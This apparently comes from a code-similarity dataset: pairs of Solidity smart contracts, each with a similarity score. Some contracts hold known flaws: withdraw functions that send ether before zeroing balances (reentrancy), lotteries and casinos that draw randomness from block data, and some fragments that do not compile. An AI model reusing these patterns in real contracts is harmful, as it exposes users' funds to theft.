        owner = msg.sender;
    }
    function emitEvent(address addr) public {
        require(msg.sender == owner);
        emit Transfer(msg.sender, addr, 1);
    }
}"
"contract Lottery {
    address public manager;
     address[] public players;

    function Lottery() public {
        manager = msg.sender;
    }

    function enter() public payable { 

        require(msg.value > 0.1 ether);
        players.push(msg.sender);
    }


    function random() public  view returns (uint) {

     return   uint(keccak256(block.difficulty,now,players));
    }

  function pickWinner() public restricted{
      uint index = random() % players.length;
      players[index].transfer(this.balance);
      players = new address[](0);
  }

  modifier restricted(){

      require (msg.sender == manager);
      _;
  }

  function getPlayers() public view returns (address[]) {
      return players;

  }

}",0.6776427138970942,"contract Dealer {

    address public pitboss;
    uint public constant ceiling = 0.25 ether;

    event Deposit(address indexed _from, uint _value);

    function Dealer() public {
      pitboss = msg.sender;
    }

    function () public payable {
      Deposit(msg.sender, msg.value);
    }

    modifier pitbossOnly {
      require(msg.sender == pitboss);
      _;
    }

    function cashout(address winner, uint amount) public pitbossOnly {
      winner.transfer(amount);
    }

    function overflow() public pitbossOnly {
      require (this.balance > ceiling);
      pitboss.transfer(this.balance - ceiling);
    }

    function kill() public pitbossOnly {
      selfdestruct(pitboss);
    }

}"
"contract test { 

mapping (address => uint256) public balanceOf; 

function test() { 

}

function FunctionX(address _address)
{
    balanceOf[_address] = 50000;    
}
}",0.690409730115819,"contract token { function transfer(address receiver, uint amount) public{  }

    function balanceOf(address _owner) public returns (uint256 balance){ }

}"
"contract Music {

        address public buyer;
        address public seller;

        bool public buyerPlayed;
        bool public sellerPlayed;

        uint private buyerDeposit;
        uint private sellerDeposit;

        bool public transactionFinished; 
        address public theNewOwner;
        string gains;


        event AuctionStartsEvent(address buyer, address seller);
        event EndOfAuctionEvent(address owner, string gains);

        function Auctioning() public {
            buyer = msg.sender;
        }


        function registerAsABuyer() public {
            require(seller == address(0));

            seller = msg.sender;

            emit AuctionStartsEvent(buyer, seller);
        }


        function auction() public payable {
            require(!transactionFinished && (msg.sender == buyer || msg.sender == seller));

            if(msg.sender == buyer) {
                require(buyerPlayed == false);
                buyerPlayed = true;
                buyerDeposit = buyerDeposit + msg.value;
            } else { 
                require(sellerPlayed == false);
                sellerPlayed = true;
                sellerDeposit = sellerDeposit + msg.value;
            }
            if(buyerPlayed && sellerPlayed) {
                if(buyerDeposit >= sellerDeposit * 2) {
                    endOfAuction(buyer);
                } else if (sellerDeposit >= buyerDeposit * 2) {
                    endOfAuction(seller);
                }
            }
        }


        function endOfAuction(address owner) internal {
            transactionFinished = true;
            theNewOwner = owner;

            gains = ""You have recived your song!"";
            emit EndOfAuctionEvent(owner, gains);
        }

    }",0.6072201012613758,"contract PopConChain is StandardToken {

    string public name = 'PopConChain';

    string public symbol = 'POPCON';

    uint public decimals = 10;

    uint public INITIAL_SUPPLY = 44.63 * 100000000 * (10 ** decimals);

    address owner;

    bool public released = false;



    constructor() public {

        totalSupply_ = INITIAL_SUPPLY;

        balances[msg.sender] = INITIAL_SUPPLY;

        owner = msg.sender;

    }



    function release() public {

        require(owner == msg.sender);

        require(!released);

        released = true;

    }



    function lock() public {

        require(owner == msg.sender);

        require(released);

        released = false;

    }



    function get_Release() view public returns (bool) {

        return released;

    }



    modifier onlyReleased() {

        if (owner != msg.sender)

          require(released);

        _;

    }



    function transfer(address to, uint256 value) public onlyReleased returns (bool) {

        super.transfer(to, value);

    }



    function allowance(address _owner, address _spender) public onlyReleased view returns (uint256) {

        super.allowance(_owner, _spender);

    }



    function transferFrom(address from, address to, uint256 value) public onlyReleased returns (bool) {

        super.transferFrom(from, to, value);

    }



    function approve(address spender, uint256 value) public onlyReleased returns (bool) {

        super.approve(spender, value);

    }

}"
"contract D {
    uint public x;
    constructor(uint a) public payable {
        x = a;
    }
}",0.6580340609892805,"contract Token {

	uint8 public decimals;



  	constructor () public {

		decimals = 24;

  	}

}"
"contract DataBase {
    function increaseUnitExp(uint _id, uint amount) public;
}",0.6730323668332947,"contract Mintable {
    function mint(address to, uint256 amount) public;
}"
"contract TestShaAlgo {
  function getSha256(string str) public view returns (bytes32) {
  bytes32 hash = sha256(abi.encodePacked(str));
  return hash;
  }
}",0.6266900665568521,"contract PazhukovMaxInETH {
    
    bytes32 info = ""I'm smart contract from p5m.ru!"";
    
    function getInfo() view public returns (bytes32) {
        return (info);
    }
    
}"
"contract FooManager {
  struct Foo {
    uint expiresAt;
    uint balance;
  }
  mapping(address => Foo) public fooIndex;

  public function claimFrom(address minter) public payable {
    require(fooIndex[minter].balance < amount);

    fooIndex[minter].balance += msg.value;
    fooIndex[minter].expiresAt += 1000;
  }
}",0.6162550939196848,"contract PoormansHoneyPot {
    mapping (address => uint) public balances;

    constructor() public payable {
        store();
    }

    function store() public payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() public{
        assert (msg.sender.call.value(balances[msg.sender])()) ;
        balances[msg.sender] = 0;
    }


}"
"contract test {

    uint public fee; 
    function setFee(uint _fee){
      fee = Sf.mul(_fee,10);
    }

}",0.6144380280676416,"contract Stats {
  function getDay( uint128 day) public view returns (uint);
}"
"contract Inbox {
    string public message;

    constructor()  public payable {
        message = ""Hi there!"";
    }

    function setMessage(string newMessage) public {
       message = newMessage;
    }
}",0.6191830689837821,"contract LandToken is LandBase {

    string public constant name = ""LandToken"";

    string public constant symbol = ""LTT"";



    function() public payable{

        revert();

    }

}"
"contract ERC721BasicToken is ERC721Basic {

    .
    .
    .

    
    
    bytes4 constant ERC721_RECEIVED = 0xf0b9e5ba;

    .
    .
    .

    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes _data) public canTransfer(_tokenId) {
        transferFrom(_from, _to, _tokenId);
        
        require(checkAndCallSafeTransfer(_from, _to, _tokenId, _data));
    }

    .
    .
    .

    
    
    
    
    
    
    
    function checkAndCallSafeTransfer(address _from, address _to, uint256 _tokenId, bytes _data) internal returns (bool) {
        if (!_to.isContract()) {
            return true;
        }
        bytes4 retval = ERC721Receiver(_to).onERC721Received(_from, _tokenId, _data);
        return (retval == ERC721_RECEIVED);
    }

}",0.6289037327344388,"contract LimitedTransferToken is ERC20 {

  
  modifier canTransfer(address _sender, uint256 _value) {
   require(_value <= transferableTokens(_sender, uint64(now)));
   _;
  }

  
  function transfer(address _to, uint256 _value) canTransfer(msg.sender, _value) returns (bool) {
    return super.transfer(_to, _value);
  }

  
  function transferFrom(address _from, address _to, uint256 _value) canTransfer(_from, _value) returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }

  
  function transferableTokens(address holder, uint64 time) constant public returns (uint256) {
    return balanceOf(holder);
  }
}"
"contract Relay {
    address public currentVersion;
    address public owner;

    modifier onlyOwner() {
        if (msg.sender != owner) {
            throw;
        }
        _;
    }

    function Relay(address initAddr) {
        currentVersion = initAddr;
        owner = msg.sender; 
    }

    function changeContract(address newVersion) public
    onlyOwner()
    {
        currentVersion = newVersion;
    }

    function() {
        if(!currentVersion.delegatecall(msg.data)) throw;
    }
}",0.6742781758293734,"contract Ownable {



    address public owner;



    function Ownable() public {

        owner = msg.sender;

    }



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function isOwner(address _address) public constant returns (bool) {

        return _address == owner;

    }



    function transferOwnership(address newOwner) external onlyOwner {

        require(newOwner != address(0));

        owner = newOwner;

    }



}"
"contract Betting is usingOraclize {
  function Betting() {
    
  }
  function sendEther() payable returns (uint) {
    return msg.value;
  }
",0.6446544690038503,"contract XRateProvider {

    
    
    function getRate() public returns (uint32 , uint32 );

    
    function getCode() public returns (string);
}"
"contract X {

    address owner;
    uint amount;

    event test(address value);
    event trial(uint val);


    function X() {
        owner = msg.sender;
        test(msg.sender);
    }

    function invoke() payable {
        test(msg.sender);

        trial(amount);
        amount = amount + msg.value;

        trial(amount);
    }
}",0.6127588979169284,"contract Incrementer {

    event LogWinner(address winner, uint amount);
    
    uint c = 0;

    function ticket() payable {
        
        uint ethrebuts = msg.value;
        if (ethrebuts != 10) {
            throw;
        }
        c++;
        
        if (c==3) {
            LogWinner(msg.sender,this.balance);
            msg.sender.transfer(this.balance);
            c=0;
        }
    }
}"
"contract MyContract {

  string message;
  event MyEvent(address contractAddress, string message);


  constructor() public {
    message = ""I'm ready!"";
  }

  function setGreetings(string _message) public {
    message = _message;
  }

  function getGreetings() public view returns (string) {
    return message;
  }

  function triggetEvent() public {
    MyEvent(address(this), message);
  }

}",0.6305476542801326,"contract SaveData {
    mapping (uint => string) sign;
    address public owner;
    event SetString(uint key,string types);
    function SaveData() public {
        owner = msg.sender;
    }
    function setstring(uint key,string md5) public returns(string){
        sign[key]=md5;
        return sign[key];
    }

    function getString(uint key) public view returns(string){
        return sign[key];
    }
}"
"contract lottery {
  address public manager;
  address[] public players;
  string private managerRestriction = ""Managers are not allowed in competition"";
  string private playerRestriction = ""Only manager can select winner"";

  constructor() public {
    manager = msg.sender;
  }

  function allPlayer() public view returns (address[] memory){
    return players;
  }

  function enter() public payable {
    players.push(msg.sender);
  }

  function randomGenerator() private view returns (uint) {
    return uint(keccak256(abi.encodePacked(block.difficulty, now, players)));
  }

  function selectWinner() public restrictPlayer returns (address) {
    uint index = randomGenerator() % players.length;
    address payable selectedPlayer = address(uint160(players[index]));
    selectedPlayer.transfer(address(this).balance);
    players = new address[](0);
    return selectedPlayer;
  }

  modifier restrictManager() {
    require(msg.sender != manager, managerRestriction);
    _;
  }

  modifier restrictPlayer() {
    require(msg.sender == manager, playerRestriction);
    _;
  }
}",0.6148222163128432,"contract BlockchainForPeace {

    



    

    uint public raised;

    address public charity; 

    

    

    struct Donation {

        address donor; 

        string message; 

        uint value; 

    }

    

    Donation[] public donations; 

    

    

    

    event Donate(address indexed from, uint amount, string message);

    

    

    constructor () public {

        charity = 0xaf208FF43D2A265E047D52C9F54c753DB86D9D11;

    }

   

    

     function fallback() payable public {

        raised += msg.value;

        charity.transfer(msg.value);

     }

    

    function messageForPeace(string _message) payable public {

        require(msg.value > 0);

        donations.push(Donation(msg.sender, _message, msg.value));

        charity.transfer(msg.value);

        raised += msg.value;

        emit Donate(msg.sender, msg.value, _message);

    }



    function getDonation(uint _index) public view returns (address, string, uint) {

        Donation memory don = donations[_index];

        return (don.donor, don.message, don.value);

    }

    

    function getDonationLength() public view returns (uint){

        return donations.length;

    }



     function getRaised() public view returns (uint){

        return raised;

    }

}"
"contract BaseTokenBet {

BaseToken public baseToken;

address public owner;

constructor() public {
    owner = msg.sender;
    baseToken = BaseToken(owner);
}

function getOwner() public view returns (address)  {
  return owner ;
}

function getBaseToken() public view returns (BaseToken)  {
  return baseToken ;
}


function getTokenBalance() public view returns (uint256){
    return baseToken.balanceOf(owner);
}

 }",0.6494109203618377,"contract TokenLike {
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
}"
"contract Lottery {
    address public manager;
    address[] public players;
    

    constructor() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether, 'Not enough ether');
        players.push(msg.sender);
    }

    function numberPlayers() public view returns(uint) {
        return players.length;
    }
}",0.6674650701537318,"contract owned {

    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address newOwner) onlyOwner public {

        owner = newOwner;

    }



    function getOwned() onlyOwner public view returns (address) {

        return owner;

    }

}"
"contract SimpleTest {

    string key;

    constructor (string _key) {
        key = _key;
    }

    function getKey() public view returns(string) {
        return key;
    }

}",0.6172948433285259,"contract GetBBS is DataCaller {

    function getBBS(bytes32 _key, bytes32 _id) internal view returns(string) {

        return data.bbs(_key, _id);

    }

}"
"contract C {
    uint256 a=50;  

    function setA(uint256 aval) {
        a = aval;
    }
    function getA() constant returns (uint256) { 
        return a;
    }
 }",0.6981091014003397,"contract MPY {

  function getSupply() constant returns (uint256);

  
  function balanceOf(address _owner) constant returns (uint256);

}"
"contract EqHunt {

  struct Equation {
    string repr;
    int answer;
    bool exists;
  }

  mapping(string => Equation) equations;
  mapping(string => address[]) public solvers;
  address payable private owner;

  uint256 public lastSolveTime;

  uint256 private delay;

  constructor() public payable {
    owner = msg.sender;
    lastSolveTime = now;
    delay = 10 minutes;
  }

  function locked() public view returns(bool) {
    if(now - lastSolveTime <= delay) {
      return true;
    } else {
      return false;
    }
  }

  function create(string memory _id, string memory _repr, int _answer) public {

    require(msg.sender == owner);

    require(!equations[_id].exists);

    Equation memory e = Equation(_repr, _answer, true);

    equations[_id] = e;

  }

  function getEquation(string memory _id) public view returns(string memory) {
    return equations[_id].repr;
  }

  function check(string memory _id, int _answer) internal view returns(bool) {

    require(equations[_id].exists);

    if(equations[_id].answer == _answer) {
      return true;
    } else {
      return false;
    }
  }

  function rand() internal view returns(uint256) {
    return uint256(uint256(keccak256(abi.encode(block.timestamp)))%10) + 1;
  }

  function payout() internal view returns(uint256) {
    return 40000000000000000/rand();
  }

  function reward(address payable _payee) internal {

    uint256 r = payout();

    require(address(this).balance>=r);

    require(now - lastSolveTime > delay);

    _payee.transfer(r);

    lastSolveTime = now;

  }

  function solve(string memory _id, int256 _answer) public payable {
    require(!hasSolved(_id));
    bool correct = check(_id, _answer);
    require(correct);
    if(correct) {
      addSolver(_id);
      reward(msg.sender);
    }
  }

  function addSolver(string memory _id) internal {
    solvers[_id].push(msg.sender);
  }

  function hasSolved(string memory _id) internal view returns(bool) {
    address[] memory _solvers = solvers[_id];
    for(uint256 i=0; i<_solvers.length; i++) {
      if(_solvers[i] == msg.sender) {
        return true;
      }
    }
    return false;
  }

  function getNumSolvers(string memory _id) public view returns(uint256) {
    address[] memory _solvers = solvers[_id];
    return _solvers.length;
  }

  function getSolvers(string memory _id) public view returns(address[] memory) {
    return solvers[_id];
  }

  function withdraw() public payable {
    require(msg.sender == owner);
    owner.transfer(address(this).balance);
  }

  function() payable external {}

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

}",0.6635969415086529,"contract ERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor (string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;

        _totalSupply = totalSupply;
        _balances[msg.sender] = _totalSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract AssetDistribution { 
address public issuer;
uint public assetCount;

event AllocationDetails(address from, address to, string description);

function AssetDistribution() {
    issuer = msg.sender;
    
}

struct Asset {
    uint assetId;
    address currentOwner;
    string description;
    uint cost;
}
mapping (address=> mapping(uint=>Asset)) private owners;




function setCreateAsset(address newOwner, string description, uint cost) 
    returns(string) {
    if (msg.sender == issuer) {
    assetCount++;
    Asset memory myAsset = Asset(assetCount,newOwner,description,cost);      
    owners[newOwner][assetCount] = myAsset;
    AllocationDetails(msg.sender,newOwner,description);
    return ""created By: government"";
    
    } else { 
        return ""This is not the creator"";
    }
}

function getassetCount() constant returns(uint) {
    return assetCount;
}

function getOwner(uint id) returns(address) {
   
}

}",0.6139401788661447,"contract Daypick {
    address private _owner;
    mapping(uint32 => string) private _map;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() public {
        _owner = msg.sender;
    }

    function changeOwnerShip(address newOwner) public onlyOwner {
        require(newOwner != address(0), 'new owner should not be 0x0!');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function writeDay(uint32 date, string memory data) public onlyOwner {
        _map[date] = data;
    }

    function getDay(uint32 date) public view returns (string memory) {
        return _map[date];
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner(), ""Only owner can call this function."");
        _;
    }

    
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
}"
"contract DataEntityContract {


    DataEntity DE;

    constructor(string memory _name,string[] memory _relatedEntities, string memory _annotations) public
    {
        DE = DataEntity(_name, _relatedEntities, _annotations);
    }

    struct DataEntity {
        string dataEntityName;
        string[] sources;
        string annotations;
    }

    function getSources() public view returns(string[] memory){
        return (DE.sources);
    }

    function getName() public view returns(string memory){
        return (DE.dataEntityName);
    }

    function getAnnotations() public view returns(string memory) {
        return (DE.annotations);
    }

}",0.6377218085689739,"contract HuxsERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) public {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(msg.sender, totalSupply);

    }

 

    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract MyContract {

    uint256 someLevel;

    function changeLevel(uint _newLevel) public {
        someLevel = _newLevel;
    }
}",0.6053004460158011,"contract AKValueTest
{
    uint256 public someValue;
    
    function setSomeValue(uint256 newValue)
    {
        someValue = newValue;
    }
}"
"contract Roulette {

uint public lastRoundTimestamp;
uint public nextRoundTimestamp;

address _creator;
uint _interval;

enum BetType { Single, Odd, Even }

struct Bet {
    BetType betType;
    address player;
    uint number;
    uint value;
}

Bet[] public bets;

function getBetsCountAndValue() public constant returns(uint, uint) {
    uint value = 0;
    for (uint i = 0; i < bets.length; i++) {
        value += bets[i].value;
    }
    return (bets.length, value);
}

event Finished(uint number, uint nextRoundTimestamp);

modifier transactionMustContainEther() {
    if (msg.value == 0) throw;
    _;
}

modifier bankMustBeAbleToPayForBetType(BetType betType) {
    uint necessaryBalance = 0;
    for (uint i = 0; i < bets.length; i++) {
        necessaryBalance += getPayoutForType(bets[i].betType) * bets[i].value;
    }
    necessaryBalance += getPayoutForType(betType) * msg.value;
    if (necessaryBalance > this.balance) throw;
    _;
}

function getPayoutForType(BetType betType) constant returns(uint) {
    if (betType == BetType.Single) return 35;
    if (betType == BetType.Even || betType == BetType.Odd) return 2;
    return 0;
}

function Roulette(uint interval) {
    _interval = interval;
    _creator = msg.sender;
    nextRoundTimestamp = 1517784279 + _interval;
}

function betSingle(uint number) public payable transactionMustContainEther() bankMustBeAbleToPayForBetType(BetType.Single) {
    if (number > 36) throw;
    bets.push(Bet({
        betType: BetType.Single,
        player: msg.sender,
        number: number,
        value: msg.value
    }));
}

function betEven() public payable transactionMustContainEther() bankMustBeAbleToPayForBetType(BetType.Even) {
    bets.push(Bet({
        betType: BetType.Even,
        player: msg.sender,
        number: 0,
        value: msg.value
    }));
}

function betOdd() public payable transactionMustContainEther() bankMustBeAbleToPayForBetType(BetType.Odd) {
    bets.push(Bet({
        betType: BetType.Odd,
        player: msg.sender,
        number: 0,
        value: msg.value
    }));
}

function launch() public {
    if (now < nextRoundTimestamp) throw;

    uint number = uint(block.blockhash(block.number - 1)) % 37;

    for (uint i = 0; i < bets.length; i++) {
        bool won = false;
        uint payout = 0;
        if (bets[i].betType == BetType.Single) {
            if (bets[i].number == number) {
                won = true;
            }
        } else if (bets[i].betType == BetType.Even) {
            if (number > 0 && number % 2 == 0) {
                won = true;
            }
        } else if (bets[i].betType == BetType.Odd) {
            if (number > 0 && number % 2 == 1) {
                won = true;
            }
        }
        if (won) {
            if (bets[i].player.send(bets[i].value * getPayoutForType(bets[i].betType)))
            throw;
        }
    }

    uint thisRoundTimestamp = nextRoundTimestamp;
    nextRoundTimestamp = thisRoundTimestamp + _interval;
    lastRoundTimestamp = thisRoundTimestamp;

    bets.length = 0;

    Finished(number, nextRoundTimestamp);
}

}",0.6128956754024028,"contract BetOnHashV84 {
  struct Player {
    address addr;
    byte bet;
  }
  
  Player[] public players;
  bool public active;
  uint public betAmount;
  uint public playersPerRound;
  uint public round;
  uint public winPool;
  byte public betByte;

  uint lastPlayersBlockNumber;
  address owner;
  
  modifier onlyowner { if (msg.sender == owner) _ }
  
  function BetOnHashV84() {
    owner = msg.sender;
    betAmount = 1 ether;
    round = 1;
    playersPerRound = 6;
    active = true;
    winPool = 0;
  }
  
  function finishRound() internal {
    
    bytes32 betHash = block.blockhash(lastPlayersBlockNumber);
    betByte = byte(betHash);
    byte bet;
    uint8 ix; 
    
    
    address[] memory winners = new address[](playersPerRound);
    uint8 numWinners=0;
    for(ix=0; ix < players.length; ix++) {
      Player p = players[ix];
      if(p.bet < 0x80 && betByte < 0x80 || p.bet >= 0x80 && betByte >= 0x80) {
        
        winners[numWinners++] = p.addr;
      } 
      else winPool += betAmount;
    }
    
    
    if(numWinners > 0) {
      uint winAmount = (winPool / numWinners) * 99 / 100;
      for(ix = 0; ix < numWinners; ix++) {
        if(!winners[ix].send(betAmount + winAmount)) throw;
      }
      winPool = 0;
    }
    
    
    round++;
    delete players;
  }
  
  function reject() internal {
    msg.sender.send(msg.value);
  }
  
  function join() internal {
    
    if(players.length >= playersPerRound) { 
      if(block.number > lastPlayersBlockNumber) finishRound(); 
      else {reject(); return;}  
    }

    
    if(msg.value < betAmount) {
      winPool += msg.value; 
      return;
    }
    
    
    if(msg.data.length < 1) {reject();return;}
    
    
    for(uint8 i = 0; i < players.length; i++)
      if(msg.sender == players[i].addr) {reject(); return;}
    
    
    if(msg.value > betAmount) {
      msg.sender.send(msg.value - betAmount);
    }
    
    
    players.push( Player(msg.sender, msg.data[0]) );
    lastPlayersBlockNumber = block.number;
  }
  
  function () {
    if(active) join();
    else throw;
  }
  
  function paybackLast() onlyowner returns (bool) {
    if(players.length == 0) return true;
    if (players[players.length - 1].addr.send(betAmount)) {
      players.length--;
      return true;
    }
    return false;
  }
  
  
  function paybackAll() onlyowner returns (bool) {
    while(players.length > 0) {if(!paybackLast()) return false;}
    return true;
  }
  
  function collectFees() onlyowner {
    uint playersEther = winPool;
    uint8 ix;
    for(ix=0; ix < players.length; ix++) playersEther += betAmount;
    uint fees = this.balance - playersEther;
    if(fees > 0) owner.send(fees);
  }
  
  function changeOwner(address _owner) onlyowner {
    owner = _owner;
  }
  
  function setPlayersPerRound(uint num) onlyowner {
    if(players.length > 0) finishRound();
    playersPerRound = num;
  }
  
  function stop() onlyowner {
    active = false;
    paybackAll();
  }
  
  function numberOfPlayersInCurrentRound() constant returns (uint count) {
    count = players.length;
  }

  
  function kill() onlyowner {
    if(!active && paybackAll()) 
      selfdestruct(owner);
  }
}"
"contract IntExtended {

    function increment(uint _self) returns (uint) {
        return _self+1;
    }
}",0.6551831685967855,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract Casino is Mortal{
  uint minBet;
  uint houseEdge;

  event Won(bool _status, uint _amount);
  event Log(uint _value);

  function Casino(uint _minBet, uint _houseEdge) payable public {
    require(_minBet > 0);
    require(_houseEdge <= 100);
    minBet = _minBet;
    houseEdge = _houseEdge;
  }

  function() public {
    revert();
  }

  function bet(uint _number) payable public {
    require(_number > 0 && _number <= 10);
    require(msg.value >= minBet);

    uint winningNumber = block.number % 10 + 1;

    if (_number == winningNumber) {
      uint amountWon = msg.value * (100 - houseEdge)/10;
      if(!msg.sender.send(amountWon)) revert();
      emit Won(true, amountWon);
    } else {
      emit Won(false, 0);
    }
  }

  function checkContractBalance() Owned public view returns(uint) {
    return address(this).balance;
  }

}",0.6023846435223893,"contract ChessBank{

    

    mapping (address => uint) private balances;

    

    address public owner;

    

    event depositDone(string message, address accountAddress, uint amount);

    event withdrawalDone(string message, address accountAddress, uint amount);

    

    function BankContract() public {

        owner = msg.sender;

    }

    

    function deposit() public payable {

        balances[msg.sender] += msg.value;

        depositDone(""A deposit was done"", msg.sender, msg.value);

    }

    

    function withdraw(uint amount) public {

        require(balances[msg.sender] >= amount);

        balances[msg.sender] -= amount;

        

        if(!msg.sender.send(amount)){

            balances[msg.sender] += amount;

        }

        else{

            withdrawalDone(""A withdrawal was done"", msg.sender, amount);

        }

        

    }

    

    function getBalance() public constant returns (uint){

        return balances[msg.sender];

    }

}"
"contract Incrementor { 

    uint x; 


    constructor() public { 
       
       x = 10; 
    } 


    function getX() external view returns (uint xValue) { 
        return (x); 
    } 


    function incrementX(uint byThisMuch) public { 
        x += byThisMuch; 
    } 


}",0.6555528462113426,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract Test {

using SafeMath for uint256;

uint256 c = 10;

    function addition() public {
        uint256 a = 10;
        uint256 b = 10;
        c = a.add(b);
    }

    function getValue() view public returns (uint256) {
        return c;
    }

}",0.6707754985068426,"contract GST2 {
  function mint(uint256 value) public {}
  function freeUpTo(uint256 value) public returns (uint256 freed) {}
  function freeFromUpTo(address from, uint256 value) public returns (uint256 freed) {}
}"
"contract PermService {
  address vendor;

  event ServiceTransfer(address _from, address _to, uint _amount)

  function PermService() {
  vendor = msg.sender;


  }

  function buyPermService() returns (bool success) {
  if...
  ...
  ServiceTransfer(msg.sender, receiver, amount);
  return true;
  }
}",0.68670000288466,"contract ERC20 { 
    function transfer(address receiver, uint amount) public ;
    function transferFrom(address sender, address receiver, uint amount) public returns(bool success); 
    function balanceOf(address _owner) constant public returns (uint256 balance);
}"
"contract EventTest {

   string fName;
   uint age;

   event doSetInstructor();
   event instructorSetted(string name, uint age);

   function askForSetInstructor() public {
       doSetInstructor();
   }

   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
       instructorSetted(fName, age);
   }

   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }

}",0.6022200209095602,"contract NamedToken {
  string public name;
  string public symbol;
  uint32 public decimals;

  function NamedToken(string _name, string _symbol, uint32 _decimals) {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
  }

  
  function getNameHash() constant returns (bytes32 result){
    return sha3(name);
  }

  
  function getSymbolHash() constant returns (bytes32 result){
    return sha3(symbol);
  }
}"
"contract MemoryAndStorage {
    mapping(uint => User) users;
    struct User{
        uint id;
        uint balance;
    }

    function addUser(uint id, uint balance) public {
        users[id] = User(id, balance);   
    }

    function updateBalance(uint id, uint balance) public {
        User storage user = users[id];
        user.balance = balance;
    }

    function getBalance(uint id) public view returns (uint) {
        return users[id].balance;
    } 

}",0.6226812571533725,"contract BasicToken is ERC20Basic {

  

  using SafeMath for uint;

  

  mapping(address => uint) balances;



  function transfer(address _to, uint _value) public{

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

  }



  function balanceOf(address _owner) public constant returns (uint balance) {

    return balances[_owner];

  }

}"
"contract Token677ReceiverMock {
    address public tokenSender;
    uint public sentValue;
    bytes public tokenData;
    bool public calledFallback = false;

    function onTokenTransfer(address _sender, uint _value, bytes memory _data)
    public {
      calledFallback = true;

      tokenSender = _sender;
      sentValue = _value;
      tokenData = _data;
    }

}",0.6350543250478894,"contract ERC223 {
    event Transfer(address indexed from, address indexed to, uint value, bytes  data);
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transfer(address to, uint value, bytes data, string customFallback) public returns (bool ok);
}"
"contract MyBank {
   mapping (address=>uint) balances;
function Deposit() {
   balances[msg.sender] += msg.value;
}
function Withdraw(uint amount) {
   if(balances[msg.sender] >= amount) {
      msg.sender.send(amount);
      balances[msg.sender] -= amount;
   }
}
function Balance() constant returns(uint) {
   return balances[msg.sender];
 }
}",0.6658628783497902,"contract PoormansHoneyPot {
    mapping (address => uint) public balances;

    constructor() public payable {
        store();
    }

    function store() public payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() public{
        assert (msg.sender.call.value(balances[msg.sender])()) ;
        balances[msg.sender] = 0;
    }


}"
"contract MyContract {
    address public owner;

    function MyContract() public {
        owner = msg.sender;
    }

    function ownerOnly() public view returns(uint) {
        if(owner != msg.sender) throw;

        
    }
}",0.6996029866059641,"contract Mew {

    address owner = msg.sender;

    function change(address a) public { if(owner==msg.sender) owner=a; }

    function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }

}"
"contract D {
    uint x;
    function D(uint a) public payable {
        x = a;
    }
}",0.6828169962611923,"contract Buyable {



    function buy() payable public returns (uint256);



}"
"contract ABSTRACTING {
    function addToWhitelist(address _ad) public;
}",0.6467180975474458,"contract I_WhiteList {
    function contains(address) public returns(bool);
}"
"contract SimpleStore {

    address[] public UserList;

    function addToWhitelist(address _ad) public {
        UserList.push(_ad);
    }
}",0.6122560253458721,"contract Simple

{

    address public owner;



